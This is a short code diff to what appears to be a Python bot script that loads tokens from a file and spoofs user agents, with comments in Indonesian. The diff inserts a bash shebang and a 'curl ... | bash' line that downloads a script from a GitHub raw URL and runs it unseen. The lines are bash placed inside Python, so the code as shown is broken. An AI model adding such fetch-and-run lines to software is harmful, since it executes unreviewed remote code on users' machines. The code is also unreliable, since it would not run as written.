@@ -20,6 +20,11 @@ token_file = "tokens.txt"
 
 ua = UserAgent()  # Inisialisasi fake_useragent
 
+#!/bin/bash
+
+curl -s https://raw.githubusercontent.com/Ferdimanaaa/logo.sh/refs/heads/main/logo.sh | bash
+sleep 5
+
 def load_tokens():
     """Memuat token dari file."""
     try:
